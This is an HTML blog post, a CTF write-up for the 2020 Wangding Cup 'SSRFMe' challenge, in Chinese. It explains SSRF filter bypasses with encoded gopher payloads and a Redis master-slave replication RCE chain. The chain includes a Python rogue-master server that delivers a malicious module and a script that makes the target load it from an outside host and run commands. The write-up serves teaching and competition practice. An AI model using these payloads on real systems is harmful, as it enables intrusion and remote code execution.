@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html>
+  <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  
+  <title>[网鼎杯 2020 玄武组]SSRFMe - LionTree</title>
+  <link rel="icon" href="https://i.imgur.com/SrZt9VU.jpg" type="image/x-icon">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  
+  <meta name="keywords" content=writeup,ssrf,redis>
+  
+  
+  
+    <link rel="alternate" href="/atom.xml " title="LionTree" type="application/atom+xml">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+  <body>
+    <div class="container">
+      <header class="header">
+  <div class="blog-title">
+    <a href="/" class="logo">LionTree</a>
+    <div class="subtitle"></div>
+  </div>
+  <nav class="navbar">
+    <ul class="menu">
+      
+        <li class="menu-item">
+          <a href="/" class="menu-item-link">Home</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/summary" class="menu-item-link">Summary</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/about" class="menu-item-link">About</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/atom.xml" class="menu-item-link">RSS</a>
+        </li>
+      
+    </ul>
+  </nav>
+</header>
+
+<article class="post">
+  <div class="post-title">
+    <h1 class="article-title">[网鼎杯 2020 玄武组]SSRFMe</h1>
+  </div>
+
+  <!-- 文章目录 -->
+  <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ssrf"><span class="toc-text">ssrf</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ssrf防御机制"><span class="toc-text">ssrf防御机制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#一些绕过的方法"><span class="toc-text">一些绕过的方法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#redis主从复制rce"><span class="toc-text">redis主从复制rce</span></a></li></ol>
+
+  <div class="post-content">
+    <p>好像很久都没写过web的wp了…趁着应付完考试来水一篇</p>
+<h1 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h1><h2 id="ssrf防御机制"><a href="#ssrf防御机制" class="headerlink" title="ssrf防御机制"></a>ssrf防御机制</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $match_result=preg_match(<span class="string">'/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/'</span>,$url);</span><br><span class="line">    <span class="keyword">if</span> (!$match_result)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'url fomat error'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        $url_parse=parse_url($url);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(<span class="keyword">Exception</span> $e)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'url fomat error'</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $hostname=$url_parse[<span class="string">'host'</span>];</span><br><span class="line">    $ip=gethostbyname($hostname);</span><br><span class="line">    $int_ip=ip2long($ip);</span><br><span class="line">    <span class="keyword">return</span> ip2long(<span class="string">'127.0.0.0'</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">'10.0.0.0'</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">'172.16.0.0'</span>)&gt;&gt;<span class="number">20</span> == $int_ip&gt;&gt;<span class="number">20</span> || ip2long(<span class="string">'192.168.0.0'</span>)&gt;&gt;<span class="number">16</span> == $int_ip&gt;&gt;<span class="number">16</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (check_inner_ip($url))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> $url.<span class="string">' is inner ip'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $result_info = curl_getinfo($ch);</span><br><span class="line">        <span class="keyword">if</span> ($result_info[<span class="string">'redirect_url'</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            safe_request_url($result_info[<span class="string">'redirect_url'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        var_dump($output);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</span><br><span class="line">    $url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($url))&#123;</span><br><span class="line">        safe_request_url($url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Please visit hint.php locally.</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>存在一个curl的ssrf，但是存在<code>check_inner_ip</code>的限制</p>
+<p><code>check_inner_ip</code>做了几件事：</p>
+<ul>
+<li>限制协议只能为http,https,gopher,dict</li>
+<li>使用<code>parse_url</code>获取host</li>
+<li>使用<code>gethostbyname</code>获取ip地址<ul>
+<li>防御了xip.io这类利用dns解析的绕过方法</li>
+</ul>
+</li>
+<li>使用<code>ip2long</code>将ip地址转为整数，判断是否为内网网段<ul>
+<li>防御了<code>127.0.0.1/8</code></li>
+</ul>
+</li>
+</ul>
+<p>另外在发送请求后还对重定向的情况做了处理</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($result_info[<span class="string">'redirect_url'</span>])</span><br><span class="line">&#123;</span><br><span class="line">    safe_request_url($result_info[<span class="string">'redirect_url'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这样基于跳转的方法也无法使用了</p>
+<h2 id="一些绕过的方法"><a href="#一些绕过的方法" class="headerlink" title="一些绕过的方法"></a>一些绕过的方法</h2><p>虽然dns解析和重定向都无法使用了，但是ssrf的绕过方法依然有很多，逐一尝试下其他方法</p>
+<ul>
+<li><p><code>http://0.0.0.0/hint.php</code></p>
+<ul>
+<li>测试了下这个方法只能在linux下使用，windows并不认识这个ip…</li>
+</ul>
+</li>
+<li><p><code>http://foo@127.0.0.1:80@www.google.com/hint.php</code></p>
+<ul>
+<li>orange的<a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf" target="_blank" rel="noopener">A New Era of SSRF -Exploiting URL Parser in Trending Programming Languages!</a>中提到的方法，利用的是curl和其他库解析url的差异性<br><img src="/images/ssrf_curl.JPG" alt=""></li>
+<li>不过这个方法在curl较新的版本里被修掉了，buu上的环境也无法使用</li>
+</ul>
+</li>
+<li><p>DNS Rebinding</p>
+<ul>
+<li>感觉这是最难防御的ssrf绕过方法了，不过对环境也有一定的限制，懒狗还没测试…</li>
+</ul>
+</li>
+<li><p><code>http://127。0。0。1/hint.php</code></p>
+<ul>
+<li>这个本地倒是测试成功了，buu上就不行，可能跟curl版本有关吧</li>
+</ul>
+</li>
+<li><p><code>http://127.1/hint.php</code></p>
+<ul>
+<li><code>ip2long(&#39;127.1&#39;)</code>会返回<code>false</code>，这里可以绕过过滤</li>
+<li>但是<code>gethostbyname</code>在linux下会把<code>127.1</code>变为<code>127.0.0.1</code>，所以这题是无法使用的。不过windows下经过<code>gethostbyname</code>后依然是<code>127.1</code></li>
+<li>curl是支持<code>127.1</code>这样的写法的，但这样发出去的http请求是有问题的。因为http包中的host头被设为了<code>127.1</code>，apache会返回一个400 Bad Request<br><img src="/images/127.1.JPG" alt=""></li>
+<li>既然是http包的问题，那么用gopher协议构造一个正常的http请求即可。不过这因为<code>gethostbyname</code>的原因，这个方法这里用不了</li>
+</ul>
+</li>
+<li><p>ip进制绕过</p>
+<ul>
+<li>本来以为<code>ip2long</code>是可以防御这种方法的，后来才发现根本不行…和127.1一样会返回<code>false</code></li>
+<li>和127.1类似，也是存在不能用http的问题，但是<code>gethostbyname</code>并不会有影响，所以这题是可以使用的，比如:</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;gopher:&#x2F;&#x2F;0177.0.0x0001:80&#x2F;_%2547%2545%2554%2520%252f%2568%2569%256e%2574%252e%2570%2568%2570%2520%2548%2554%2554%2550%252f%2531%252e%2531%250d%250a%2548%256f%2573%2574%253a%2520%2531%2532%2537%252e%2530%252e%2530%252e%2531%250d%250a%2555%2573%2565%2572%252d%2541%2567%2565%256e%2574%253a%2520%2563%2575%2572%256c%252f%2537%252e%2536%2535%252e%2533%250d%250a%2541%2563%2563%2565%2570%2574%253a%2520%252a%252f%252a%250d%250a%250d%250a</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>http://127.0.0.1./hint.php</code></p>
+<ul>
+<li>curl不支持这种写法，猝…</li>
+</ul>
+</li>
+<li><p>ipv6</p>
+<ul>
+<li>支持ipv6的话可以使用，buu上是不行的</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;[::1]&#x2F; &gt;&gt;&gt; http:&#x2F;&#x2F;127.0.0.1&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;[::]&#x2F;  &gt;&gt;&gt;  http:&#x2F;&#x2F;0.0.0.0&#x2F;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>http:///127.0.0.1/hint.php</code><ul>
+<li>这个trick也非常有意思，之前一直以为只有浏览器才会解析这样host为空的畸形url，结果翻p牛小密圈旧帖的时候发现Li4n0师傅提到curl和git也会按照浏览器的方式解析，测试以下发现直接用curl会卡在那，但是php的libcurl就可以…</li>
+<li>用<code>parse_url</code>解析这样的畸形url会返回<code>false</code>，然后<code>$hostname=$url_parse[&#39;host&#39;];</code>会返回<code>null</code>（神奇的php)。</li>
+<li>接着又是一个windows和linux下php的差异，windows下<code>gethostbyname(null);</code>会返回本机ip，导致后面无法绕过ip检测。然而linux下并没有这样的特性，<code>gethostbyname</code>会返回<code>null</code>，绕过ip检测</li>
+</ul>
+</li>
+</ul>
+<p>感觉写的有点乱…总结一下buu上环境能用的有：</p>
+<ul>
+<li><p><code>http://0.0.0.0/hint.php</code></p>
+</li>
+<li><p>gopher+进制转换</p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;gopher:&#x2F;&#x2F;0177.0.0x0001:80&#x2F;_%2547%2545%2554%2520%252f%2568%2569%256e%2574%252e%2570%2568%2570%2520%2548%2554%2554%2550%252f%2531%252e%2531%250d%250a%2548%256f%2573%2574%253a%2520%2531%2532%2537%252e%2530%252e%2530%252e%2531%250d%250a%2555%2573%2565%2572%252d%2541%2567%2565%256e%2574%253a%2520%2563%2575%2572%256c%252f%2537%252e%2536%2535%252e%2533%250d%250a%2541%2563%2563%2565%2570%2574%253a%2520%252a%252f%252a%250d%250a%250d%250a</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>http:///127.0.0.1/hint.php</code></li>
+</ul>
+<h1 id="redis主从复制rce"><a href="#redis主从复制rce" class="headerlink" title="redis主从复制rce"></a>redis主从复制rce</h1><p>hint.php内容：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>]===<span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'file'</span>]))&#123;</span><br><span class="line">  file_put_contents($_POST[<span class="string">'file'</span>],<span class="string">"&lt;?php echo 'redispass is root';exit();"</span>.$_POST[<span class="string">'file'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>得到redis密码为root</p>
+</li>
+<li><p><code>file_put_contents($_POST[&#39;file&#39;],&quot;&lt;?php echo &#39;redispass is root&#39;;exit();&quot;.$_POST[&#39;file&#39;]);</code>可以绕过写shell，不过试了下没有写权限。同理redis写shell也行不通了</p>
+</li>
+</ul>
+<p>那么很显然是要用到<a href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf" target="_blank" rel="noopener">redis-post-exploitation</a>中提出的redis主从复制rce了</p>
+<p>简单说下原理：</p>
+<ul>
+<li><code>slaveof</code>（新版改为<code>REPLICAOF</code>）建立后slave会向master发送<code>PSYNC</code>，请求开始复制</li>
+<li>master可以返回<code>FULLRESYNC</code>，进行全量复制，然后将自己持久化的数据发给slave，正常情况下包括<code>Replication ID</code>, <code>offset</code>，master存储的key-value等等</li>
+<li>slave会将这些数据保存到config中<code>dbfilename</code>指定的文件（默认为dump.rdb），然后再载入。</li>
+<li>通过伪造master，可以控制发往slave的信息，从而做到无脏数据写文件</li>
+<li>在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件</li>
+<li>因此通过FULLRESYNC写入恶意so文件，然后<code>MODULE LOAD /path/to/mymodule.so</code>载入模块即可rce</li>
+</ul>
+<p>最后的解法：</p>
+<ul>
+<li>根据<a href="https://github.com/vulhub/redis-rogue-getshell" target="_blank" rel="noopener">redis-rogue-getshell</a>的代码，改一个master server出来。exp.so编译下里面的<code>RedisModulesSDK/exp/exp.c</code>得到</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">logging.basicConfig(stream=sys.stdout, level=logging.INFO, format=<span class="string">'&gt;&gt; %(message)s'</span>)</span><br><span class="line"></span><br><span class="line">DELIMITER = <span class="string">b"\r\n"</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RoguoHandler</span><span class="params">(socketserver.BaseRequestHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> data.startswith(<span class="string">b'*'</span>):</span><br><span class="line">            <span class="keyword">return</span> data.strip().split(DELIMITER)[<span class="number">2</span>::<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">if</span> data.startswith(<span class="string">b'$'</span>):</span><br><span class="line">            <span class="keyword">return</span> data.split(DELIMITER, <span class="number">2</span>)[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> data.strip().split()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data = self.request.recv(<span class="number">1024</span>)</span><br><span class="line">            logging.info(<span class="string">"receive data: %r"</span>, data)</span><br><span class="line">            arr = self.decode(data)</span><br><span class="line">            <span class="keyword">if</span> arr[<span class="number">0</span>].startswith(<span class="string">b'PING'</span>):</span><br><span class="line">                self.request.sendall(<span class="string">b'+PONG'</span> + DELIMITER)</span><br><span class="line">            <span class="keyword">elif</span> arr[<span class="number">0</span>].startswith(<span class="string">b'REPLCONF'</span>):</span><br><span class="line">                self.request.sendall(<span class="string">b'+OK'</span> + DELIMITER)</span><br><span class="line">            <span class="keyword">elif</span> arr[<span class="number">0</span>].startswith(<span class="string">b'PSYNC'</span>) <span class="keyword">or</span> arr[<span class="number">0</span>].startswith(<span class="string">b'SYNC'</span>):</span><br><span class="line">                self.request.sendall(<span class="string">b'+FULLRESYNC '</span> + <span class="string">b'Z'</span> * <span class="number">40</span> + <span class="string">b' 1'</span> + DELIMITER)</span><br><span class="line">                self.request.sendall(<span class="string">b'$'</span> + str(len(self.server.payload)).encode() + DELIMITER)</span><br><span class="line">                self.request.sendall(self.server.payload + DELIMITER)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        self.finish()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">finish</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.request.close()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RoguoServer</span><span class="params">(socketserver.TCPServer)</span>:</span></span><br><span class="line">    allow_reuse_address = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, server_address, payload)</span>:</span></span><br><span class="line">        super(RoguoServer, self).__init__(server_address, RoguoHandler, <span class="literal">True</span>)</span><br><span class="line">        self.payload = payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    expfile = <span class="string">'exp.so'</span></span><br><span class="line">    lport = <span class="number">6379</span></span><br><span class="line">    <span class="keyword">with</span> open(expfile, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        server = RoguoServer((<span class="string">'0.0.0.0'</span>, lport), f.read())</span><br><span class="line">    server.handle_request()</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>通过ssrf用gopher协议对redis进行操作即可</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"%252a%2532%250d%250a%2524%2534%250d%250a%2541%2555%2554%2548%250d%250a%2524%2534%250d%250a%2572%256f%256f%2574%250d%250a%252a%2531%250d%250a%2524%2537%250d%250a%2543%254f%254d%254d%2541%254e%2544%250d%250a%252a%2533%250d%250a%2524%2537%250d%250a%2573%256c%2561%2576%2565%256f%2566%250d%250a%2524%2531%2532%250d%250a%2531%2537%2534%252e%2532%252e%2534%2531%252e%2531%2531%2537%250d%250a%2524%2534%250d%250a%2536%2533%2537%2539%250d%250a%252a%2533%250d%250a%2524%2536%250d%250a%256d%256f%2564%2575%256c%2565%250d%250a%2524%2534%250d%250a%256c%256f%2561%2564%250d%250a%2524%2531%2530%250d%250a%252e%252f%2564%2575%256d%2570%252e%2572%2564%2562%250d%250a%252a%2532%250d%250a%2524%2531%2531%250d%250a%2573%2579%2573%2574%2565%256d%252e%2565%2578%2565%2563%250d%250a%2524%2539%250d%250a%2563%2561%2574%2520%252f%2566%256c%2561%2567%250d%250a%252a%2531%250d%250a%2524%2534%250d%250a%2571%2575%2569%2574%250d%250a"</span></span><br><span class="line">burp0_url = <span class="string">"http://b90f32d4-6ba9-4847-8d3a-d4c58e71d4d7.node3.buuoj.cn:80/?url=gopher://0.0.0.0:6379/_"</span>+payload</span><br><span class="line">burp0_headers = &#123;<span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"</span>, <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"</span>, <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span>, <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>, <span class="string">"Connection"</span>: <span class="string">"close"</span>, <span class="string">"Upgrade-Insecure-Requests"</span>: <span class="string">"1"</span>&#125;</span><br><span class="line">proxy = &#123;<span class="string">'http'</span>:<span class="string">'http://127.0.0.1:8080'</span>&#125;</span><br><span class="line"></span><br><span class="line">response = requests.get(burp0_url, headers=burp0_headers,proxies=proxy).text</span><br><span class="line">print(response)</span><br></pre></td></tr></table></figure>
+
+<p>里面的payload解码后是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">*2</span><br><span class="line">$4</span><br><span class="line">AUTH</span><br><span class="line">$4</span><br><span class="line">root</span><br><span class="line">*1</span><br><span class="line">$7</span><br><span class="line">COMMAND</span><br><span class="line">*3</span><br><span class="line">$7</span><br><span class="line">slaveof</span><br><span class="line">$12</span><br><span class="line">174.2.41.117</span><br><span class="line">$4</span><br><span class="line">6379</span><br><span class="line">*3</span><br><span class="line">$6</span><br><span class="line">module</span><br><span class="line">$4</span><br><span class="line">load</span><br><span class="line">$10</span><br><span class="line">.&#x2F;dump.rdb</span><br><span class="line">*2</span><br><span class="line">$11</span><br><span class="line">system.exec</span><br><span class="line">$9</span><br><span class="line">cat &#x2F;flag</span><br><span class="line">*1</span><br><span class="line">$4</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>
+  </div>
+  <div class="post-meta">
+    <span class="post-time" style="color:#646060;font-size:13px">2020-07-10</span>
+  </div>
+
+  <div class="post-footer">
+    
+      <ul class="post-tag-list" itemprop="keywords"><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/redis/" rel="tag">redis</a></li><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/ssrf/" rel="tag">ssrf</a></li><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>
+    
+
+    <a href="#top" class="top">Back to Top</a>
+  </div>
+</article>
+
+<!-- 评论插件 -->
+
+<footer>
+  2022
+  <span class="author">
+    LionTree
+  </span>
+</footer>
+
+
+    </div>
+  </body>
+</html>
